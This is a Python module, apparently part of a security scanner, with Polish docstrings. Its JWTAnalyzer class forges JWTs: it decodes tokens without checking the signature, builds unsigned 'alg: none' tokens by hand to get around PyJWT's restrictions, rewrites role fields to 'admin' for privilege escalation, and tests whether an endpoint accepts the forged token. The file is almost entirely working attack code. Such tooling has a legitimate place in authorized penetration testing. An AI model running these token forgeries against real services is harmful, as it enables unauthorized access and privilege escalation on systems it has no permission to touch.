import jwt
import structlog
import base64
import json
import httpx
import copy
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from aegis.core.models import TargetEndpoint
from typing import Optional, Dict, Any

logger = structlog.get_logger(__name__)

class JWTAnalyzer:
    """Moduł ofensywny do analizy i manipulacji tokenami JWT (Auth Bypass)."""
    @staticmethod
    async def verify_auth_bypass(client: httpx.AsyncClient, endpoint: 'TargetEndpoint', forged_token: str, original_headers: dict) -> bool:
        """
        Weryfikuje obejście autoryzacji poprzez porównanie żądania bazowego (bez tokenu)
        z żądaniem zawierającym sfałszowany token (Algorithm Confusion).
        Używa client.stream() aby uniknąć OOM/Tarpit.
        """
        from aegis.core.http_client import AegisHTTPClient
        
        baseline_headers = {k: v for k, v in original_headers.items() if k.lower() != "authorization"}
        req_kwargs = {
            "method": endpoint.method,
            "url": str(endpoint.url),
            "headers": baseline_headers
        }
        if endpoint.body_template:
            req_kwargs["json"] = AegisHTTPClient.inject_payload(
                copy.deepcopy(endpoint.body_template), "JWT_BASELINE_TEST"
            )
            
        try:
            async with client.stream(**req_kwargs) as baseline_resp:
                baseline_rejected = baseline_resp.status_code in (401, 403)
        except Exception:
            baseline_rejected = True 
            
        if not baseline_rejected:
            return False 
            
        req_kwargs["headers"]["Authorization"] = f"Bearer {forged_token}"
        try:
            async with client.stream(**req_kwargs) as forged_resp:
                forged_accepted = 200 <= forged_resp.status_code < 300
        except Exception:
            forged_accepted = False
            
        return forged_accepted
    
    
    @staticmethod
    def decode_unsafe(token: str) -> Optional[Dict[str, Any]]:
        """
        Dekoduje payload JWT bez weryfikacji podpisu.
        Służy do mapowania struktury ról (Role Matrix) wewnątrz tokenu.
        """
        # Ochrona przed CPU Exhaustion (Max 8KB dla tokenu)
        if len(token) > 8192:
            logger.warning("JWT token rejected: length limit exceeded (8,192 characters). Potential DoS attack.")
            return None
            
        try:
            return jwt.decode(token, options={"verify_signature": False})
        except (jwt.DecodeError, RecursionError, ValueError) as e:
            logger.error("Invalid JWT format", error=str(e))
            return None

    @staticmethod
    def create_none_algorithm_token(token: str) -> Optional[str]:
        """
        Generuje token z algorytmem 'none' (Algorithm Confusion Attack).
        Weryfikuje, czy backend LLM akceptuje tokeny bez kryptograficznego podpisu.
        """
        payload = JWTAnalyzer.decode_unsafe(token)
        if not payload:
            return None

        try:
            # Ręczne budowanie tokenu omija restrykcje biblioteki PyJWT >= 2.0
            header_b64 = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode('utf-8').rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8').rstrip('=')
            return f"{header_b64}.{payload_b64}."
        except Exception as e:
            logger.error("Error while generating the token 'none'", error=str(e))
            return None

    @staticmethod
    def elevate_privileges(token: str, target_role: str = "admin") -> Optional[str]:
        """
        Modyfikuje payload, podnosząc uprawnienia (Privilege Escalation),
        a następnie podpisuje go algorytmem 'none'.
        """
        payload = JWTAnalyzer.decode_unsafe(token)
        if not payload:
            return None

        # Szuka standardowych kluczy definiujących uprawnienia
        role_keys = ["role", "roles", "group", "permissions", "is_admin", "admin"]
        modified = False

        for key in role_keys:
            if key in payload:
                if isinstance(payload[key], list):
                    payload[key] = [target_role]
                elif isinstance(payload[key], bool):
                    payload[key] = True
                else:
                    payload[key] = target_role
                modified = True

        # Jeśli nie znaleziono standardowego klucza, wstrzykuje własny 
        if not modified:
            payload["role"] = target_role

        try:
            # Ręczne budowanie tokenu omija restrykcje PyJWT >= 2.0
            header_b64 = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode('utf-8').rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8').rstrip('=')
            return f"{header_b64}.{payload_b64}."
        except Exception as e:
            logger.error("Error while elevating privileges", error=str(e))
            return None